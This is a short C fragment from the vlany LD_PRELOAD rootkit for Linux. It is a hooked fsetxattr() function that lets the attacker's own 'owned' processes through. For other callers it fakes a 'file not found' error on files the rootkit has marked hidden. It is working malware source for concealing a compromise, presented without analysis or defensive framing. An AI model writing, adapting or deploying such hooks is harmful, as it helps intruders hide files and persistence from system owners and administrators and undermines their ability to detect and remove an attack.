int fsetxattr(int fd, const char *name, const void *value, size_t size, int flags)
{
    #ifdef DEBUG
        printf("[vlany] fsetxattr() called\n");
    #endif

    HOOK(old_fsetxattr, CFSETXATTR);

    if(owned()) return old_fsetxattr(fd, name, value, size, flags);

    if(hidden_fxattr(fd)) { errno = ENOENT; return -1; }

    return old_fsetxattr(fd, name, value, size, flags);
}
